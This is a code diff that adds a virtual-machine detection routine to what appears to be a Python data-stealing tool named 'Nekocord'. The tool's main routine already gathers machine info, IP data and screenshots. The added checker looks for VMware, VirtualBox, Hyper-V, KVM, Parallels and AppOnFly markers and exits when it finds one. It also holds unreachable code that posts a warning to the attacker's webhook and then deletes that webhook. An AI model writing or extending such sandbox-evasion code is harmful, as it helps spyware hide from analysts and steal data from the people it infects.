@@ -161,7 +161,82 @@ def screenshot():
     else:
         pass
 
+## Anti Environment (virtual environment)
+def checker():
+    is_vm = False
+
+    ## apponfly | apponfly.com
+    hostname = socket.gethostname()
+    apponfly = "AppOnFly-VPS"
+    if hostname.lower() == apponfly.lower():
+        print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
+        is_vm = True
+
+    ## VMware | ???
+    dmesg = os.popen("dmesg | grep -i vmware").read()
+    if "VMware" in dmesg:
+        print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
+        is_vm = True
+
+    try:
+        with open("/sys/class/dmi/id/product_name", "r") as file:
+            product_name = file.read().strip()
+            if "VirtualBox" in product_name:
+                print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
+                is_vm = True
+    except FileNotFoundError:
+        pass
+
+    if os.path.exists("/sys/class/dmi/id/product_name"):
+        try:
+            with open("/sys/class/dmi/id/product_name", "r") as file:
+                product_name = file.read().strip()
+                if "Hyper-V" in product_name:
+                    print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
+                    is_vm = True
+        except FileNotFoundError:
+            pass
+
+    cpu_info = os.popen("cat /proc/cpuinfo").read()
+    if "parallels" in cpu_info.lower():
+        print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
+        is_vm = True
+
+    if os.path.exists("/dev/virtio"):
+        print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
+        is_vm = True
+
+    if os.path.exists("/sys/class/dmi/id/product_name"):
+        try:
+            with open("/sys/class/dmi/id/product_name", "r") as file:
+                product_name = file.read().strip()
+                if "KVM" in product_name:
+                    print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
+                    is_vm = True
+        except FileNotFoundError:
+            pass
+
+    if os.path.exists("/proc/scsi/scsi"):
+        scsi_info = os.popen("cat /proc/scsi/scsi").read()
+        if "VMware" in scsi_info or "VirtualBox" in scsi_info:
+            print(f"[ERROR] _MkTeRZfVb5C_?7O4wxds6Ap")
+            is_vm = True
+
+    if is_vm:
+        sys.exit(1)
+
+        data_VM = {
+            "username": "Nekocord | VM Detection", 
+            "content": f"# {types} \n ⚠️WARN⚠️ \n We've detected activity attempting to attack or debug your webhook. This webhook has been removed",
+            "avatar_url": "https://i.imgur.com/VF1uUWN.png",  
+        }
+
+        response = requests.post(h00k, json=data_VM)
+        time.sleep(2)
+        deleter = requests.delete(h00k)
+
 def main():
+    checker()
     machineinfo()
     iplogger()
     screenshot()
